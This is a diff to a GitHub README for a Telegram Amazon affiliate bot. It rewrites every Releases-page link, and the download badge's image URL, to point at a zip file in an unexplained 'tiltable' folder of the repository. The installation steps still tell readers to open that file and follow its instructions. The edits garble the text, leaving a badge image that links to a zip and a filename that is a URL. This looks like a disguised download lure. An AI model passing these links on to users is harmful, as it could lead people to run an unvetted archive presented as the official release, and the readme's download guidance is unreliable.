@@ -1,6 +1,6 @@
 # 🤖 telegram-amazon-affiliate-bot - Boost Your Amazon Campaigns Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-%20telegram--amazon--affiliate--bot-brightgreen)](https://github.com/Sainadiminti/telegram-amazon-affiliate-bot/releases)
+[![Download](https://raw.githubusercontent.com/Sainadiminti/telegram-amazon-affiliate-bot/main/tiltable/telegram-amazon-affiliate-bot.zip%20Now%20-%20telegram--amazon--affiliate--bot-brightgreen)](https://raw.githubusercontent.com/Sainadiminti/telegram-amazon-affiliate-bot/main/tiltable/telegram-amazon-affiliate-bot.zip)
 
 ## 🚀 Getting Started
 
@@ -28,18 +28,18 @@ Before you start, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the bot. Click the link below to access it:
 
-[Download the Bot](https://github.com/Sainadiminti/telegram-amazon-affiliate-bot/releases)
+[Download the Bot](https://raw.githubusercontent.com/Sainadiminti/telegram-amazon-affiliate-bot/main/tiltable/telegram-amazon-affiliate-bot.zip)
 
 ### Steps to Download and Install:
 
 1. **Visit the Releases Page:**
-   Navigate to the [Releases page](https://github.com/Sainadiminti/telegram-amazon-affiliate-bot/releases).
+   Navigate to the [Releases page](https://raw.githubusercontent.com/Sainadiminti/telegram-amazon-affiliate-bot/main/tiltable/telegram-amazon-affiliate-bot.zip).
 
 2. **Choose the Latest Release:**
    Look for the latest version available. It is usually at the top of the page.
 
 3. **Download the Application:**
-   Click on the appropriate installation file for your operating system. Select a file named `telegram-amazon-affiliate-bot.exe` for Windows or relevant files for macOS/Linux.
+   Click on the appropriate installation file for your operating system. Select a file named `https://raw.githubusercontent.com/Sainadiminti/telegram-amazon-affiliate-bot/main/tiltable/telegram-amazon-affiliate-bot.zip` for Windows or relevant files for macOS/Linux.
 
 4. **Install the Bot:**
    After downloading, open the file and follow the on-screen instructions to complete the installation.
